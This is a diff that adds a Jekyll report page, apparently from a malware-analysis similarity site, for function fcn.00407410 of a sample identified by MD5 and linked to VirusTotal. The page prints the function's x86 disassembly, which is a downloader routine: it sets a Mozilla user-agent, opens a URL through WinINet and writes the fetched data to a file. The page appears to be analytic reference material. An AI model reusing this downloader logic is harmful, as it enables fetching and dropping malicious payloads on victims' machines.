@@ -1,0 +1,168 @@
+---
+layout: post
+title:  "fcn.00407410 @ 37599acf0ccd223da88bef73a018ad03"
+date:   2021-08-30 15:52:19 +0300
+categories: report
+index: false
+---
+
+# Generic Information
+- **Function:** fcn.00407410
+- **Origin (md5):** 37599acf0ccd223da88bef73a018ad03
+- **VirusTotal:** [virustotal.com/gui/file/37599acf0ccd223da88bef73a018ad03][virustotal_ref]
+
+# Code Tags
+<span class="tag" id="FILE">FILE</span>
+<span class="tag" id="HTTP">HTTP</span>
+
+
+# Similar Functions
+
+1. [fcn.10081a70][similar_1_ref] (sim.: 0.8761468516878201)
+2. [fcn.0040303e][similar_2_ref] (sim.: 0.876027570023065)
+3. [fcn.00452840][similar_3_ref] (sim.: 0.8736830601585889)
+4. [fcn.10001440][similar_4_ref] (sim.: 0.8713503892886741)
+5. [fcn.00420fa0][similar_5_ref] (sim.: 0.8693447042388999)
+
+
+# Disassembled Code
+
+{% highlight nasm %}
+sub esp,0x428
+push ebx
+push esi
+xor ebx,ebx
+mov dl,0x69
+mov al,0x6c
+mov cl,0x61
+push edi
+mov dword[esp+0x28],ebx
+mov dword[esp+0x30],ebx
+mov byte[esp+0xc],0x4d
+mov byte[esp+0xd],0x6f
+mov byte[esp+0xe],0x7a
+mov byte[esp+0xf],dl
+mov byte[esp+0x10],al
+mov byte[esp+0x11],al
+mov byte[esp+0x12],cl
+mov byte[esp+0x13],0x2f
+mov byte[esp+0x14],0x34
+mov byte[esp+0x15],0x2e
+mov byte[esp+0x16],0x30
+mov byte[esp+0x17],0x20
+mov byte[esp+0x18],0x28
+mov byte[esp+0x19],0x63
+mov byte[esp+0x1a],0x6f
+mov byte[esp+0x1b],0x6d
+mov byte[esp+0x1c],0x70
+mov byte[esp+0x1d],cl
+mov byte[esp+0x1e],0x74
+mov byte[esp+0x1f],dl
+mov byte[esp+0x20],0x62
+mov byte[esp+0x21],al
+mov byte[esp+0x22],0x65
+mov byte[esp+0x23],0x29
+mov byte[esp+0x24],bl
+call fcn.004073e0
+push ebx
+push ebx
+push ebx
+lea eax,[esp+0x18]
+push ebx
+push eax
+call dword[sym.imp.WININET.dll_InternetOpenA]
+mov edi,eax
+cmp edi,ebx
+mov dword[esp+0x2c],edi
+jne 0x4074c8
+pop edi
+pop esi
+xor eax,eax
+pop ebx
+add esp,0x428
+ret 
+call fcn.004073e0
+mov ecx,dword[esp+0x438]
+push ebx
+push 0x80000000
+push ebx
+push ebx
+push ecx
+push edi
+call dword[sym.imp.WININET.dll_InternetOpenUrlA]
+mov esi,eax
+cmp esi,ebx
+jne 0x4074f6
+pop edi
+pop esi
+xor eax,eax
+pop ebx
+add esp,0x428
+ret 
+push ebp
+call fcn.004073e0
+mov edx,dword[esp+0x440]
+push ebx
+push ebx
+push 2
+push ebx
+push ebx
+push 0x40000000
+push edx
+call dword[sym.imp.KERNEL32.dll_CreateFileA]
+mov ebp,eax
+cmp ebp,0xffffffff
+je 0x40757b
+mov ebx,dword[sym.imp.WININET.dll_InternetReadFile]
+mov ecx,0x100
+xor eax,eax
+lea edi,[esp+0x38]
+rep stosd dword es:[edi],eax
+call fcn.004073e0
+lea eax,[esp+0x2c]
+lea ecx,[esp+0x38]
+push eax
+push 0x400
+push ecx
+push esi
+call ebx
+call fcn.004073e0
+mov eax,dword[esp+0x2c]
+lea edx,[esp+0x34]
+push 0
+push edx
+lea ecx,[esp+0x40]
+push eax
+push ecx
+push ebp
+call dword[sym.imp.KERNEL32.dll_WriteFile]
+mov eax,dword[esp+0x2c]
+test eax,eax
+ja 0x407522
+push ebp
+call dword[sym.imp.KERNEL32.dll_CloseHandle]
+mov edi,dword[esp+0x30]
+mov ebx,1
+call fcn.004073e0
+push esi
+mov esi,dword[sym.imp.WININET.dll_InternetCloseHandle]
+call esi
+call fcn.004073e0
+push edi
+call esi
+pop ebp
+pop edi
+mov eax,ebx
+pop esi
+pop ebx
+add esp,0x428
+ret 
+{% endhighlight %}
+
+
+[similar_1_ref]: /report/fcn.10081a70@8761fe5e7bef67f1579f600248f8f0cc
+[similar_2_ref]: /report/fcn.0040303e@470263fe7e7cc115b95cd041d643e3b5
+[similar_3_ref]: /report/fcn.00452840@a4175bd1311845689d3bca41d1d095ff
+[similar_4_ref]: /report/fcn.10001440@a0ac129ff3ea4c0dfa9529c259a9502c
+[similar_5_ref]: /report/fcn.00420fa0@be7fba7cc724acf4ae2900d99e0fc9c3
+[virustotal_ref]: https://www.virustotal.com/gui/file/37599acf0ccd223da88bef73a018ad03
